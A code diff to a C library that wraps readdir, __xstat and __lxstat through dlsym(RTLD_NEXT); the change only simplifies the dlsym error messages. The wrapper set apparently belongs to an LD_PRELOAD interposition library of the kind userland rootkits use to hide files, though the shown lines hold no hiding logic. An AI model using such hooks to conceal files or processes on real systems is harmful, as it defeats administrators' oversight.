@@ -95,14 +95,14 @@ struct dirent		*readdir(DIR *dirp)								\
 DECLARE_READDIR(dirent64, readdir64);
 DECLARE_READDIR(dirent, readdir);
 
-#define DECLARE_XSTAT(xstat, stat, error)								\
+#define DECLARE_XSTAT(xstat, stat)										\
 	static int (*original_##xstat)(int, const char *, struct stat *) = NULL; \
 	int xstat(int ver, const char *pathname, struct stat *buf)			\
 	{																	\
 		if (original_##xstat == NULL) {									\
 			original_##xstat = dlsym(RTLD_NEXT, "__xstat");				\
 			if (original_##xstat == NULL) {								\
-				fprintf(stderr, "%s: Error in dlsym: %s\n", error, dlerror()); \
+				fprintf(stderr, "Error in dlsym: %s\n", dlerror());		\
 				return -1;												\
 			}															\
 		}																\
@@ -114,18 +114,18 @@ DECLARE_READDIR(dirent, readdir);
 		return original_##xstat(ver, pathname, buf);					\
 	}
 
-DECLARE_XSTAT(__xstat64, stat64, "xstat64");
-DECLARE_XSTAT(__xstat, stat, "xstat");
+DECLARE_XSTAT(__xstat64, stat64);
+DECLARE_XSTAT(__xstat, stat);
 
 
-#define DECLARE_LXSTAT(xstat, stat, error)								\
+#define DECLARE_LXSTAT(xstat, stat)										\
 	static int (*original_##xstat)(int, const char *, struct stat *) = NULL; \
 	int xstat(int ver, const char *pathname, struct stat *buf)			\
 	{																	\
 		if (original_##xstat == NULL) {									\
 			original_##xstat = dlsym(RTLD_NEXT, "__lxstat");			\
 			if (original_##xstat == NULL) {								\
-				fprintf(stderr, "%s: Error in dlsym: %s\n", error, dlerror()); \
+				fprintf(stderr, "Error in dlsym: %s\n", dlerror());		\
 				return -1;												\
 			}															\
 		}																\
@@ -137,8 +137,8 @@ DECLARE_XSTAT(__xstat, stat, "xstat");
 		return original_##xstat(ver, pathname, buf);					\
 	}
 
-DECLARE_LXSTAT(__lxstat64, stat64, "lxstat64");
-DECLARE_LXSTAT(__lxstat, stat, "lxstat");
+DECLARE_LXSTAT(__lxstat64, stat64);
+DECLARE_LXSTAT(__lxstat, stat);
 
 static int			get_file_name(FILE *f, char *buf, size_t size)
 {
